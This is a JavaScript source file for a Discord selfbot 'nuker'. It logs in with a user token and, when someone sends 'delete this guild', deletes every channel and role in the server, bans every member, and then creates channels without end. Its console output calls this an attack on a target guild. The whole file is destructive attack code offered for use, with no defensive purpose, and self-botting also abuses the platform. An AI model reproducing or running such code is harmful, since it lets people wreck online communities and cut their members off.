const Discord = require("discord.js-selfbot")
const {red, green} = require("chalk")
const client = new Discord.Client()
const {token} = require("./config.json")

client.on("ready", () => {
    console.log(green("Ready to "), red("delete everything"))
})

client.on("message", message => {
    
    if(message.content == "delete this guild"){

        // Just log guild information
        console.log(green("=========="), red("GUILD INFORMATION"), green("=========="))
        console.log(green(`Guild Name: `), red(message.guild.name))
        console.log(green(`Guild Owner: `), red(message.guild.ownerID))
        console.log(green(`Channels: `), red(message.guild.channels.cache.size()))
        console.log(green(`Members: `), red(message.guild.memberCount()))
        console.log(green(`Roles: `), red(message.guild.roles.cache.size()))
        console.log(green("=========="), red("STARTING ATTACK"), green("=========="))

        // Delete all channels in target guild
        message.guild.channels.cache.forEach(channel => {

            try {
                channel.delete()
                console.log(red(`[CHANNEL]`), green("Channel  "), red(channel.name), green("  Deleted"))
            } catch (error) {
                console.log(red(`[CHANNEL]Can't delete channel ${channel.name}`))
            }

        })

        console.log(green("=========="), red("All Channels Deleted"), green("=========="))

        // Delete all roles in target guild
        message.guild.roles.cache.forEach(role => {

            try {
                role.delete()
                console.log(red(`[ROLE]`), green("Role  "), red(role.name), green("  Deleted"))
            } catch (error) {
                console.log(red(`[ROLE]Can't delete role ${role.name}`))
            }
            
        })

        console.log(green("=========="), red("All Roles Deleted"), green("=========="))

        // Ban all members in target guild
        message.guild.members.cache.forEach(member => {

            try {
                member.ban()
                console.log(red(`[MEMBER]`), green("User  "), red(member.user.tag), green("  Banned"))   
            } catch (error) {
                console.log(red(`[MEMBER]Can't ban user ${member.user.tag}`))
            }

        })

        console.log(green("=========="), red("All Members Banned"), green("=========="))
        console.log(green("=========="), red("Creating unlimit channels"), green("=========="))

        // Create unlimit channels (Discord Channel Max Limit : 500)
        while (true) {
            try {
                message.guild.channels.create("This guild deleted")
            } catch (error) {
                break;
            }
        }

    }

})

client.login(token)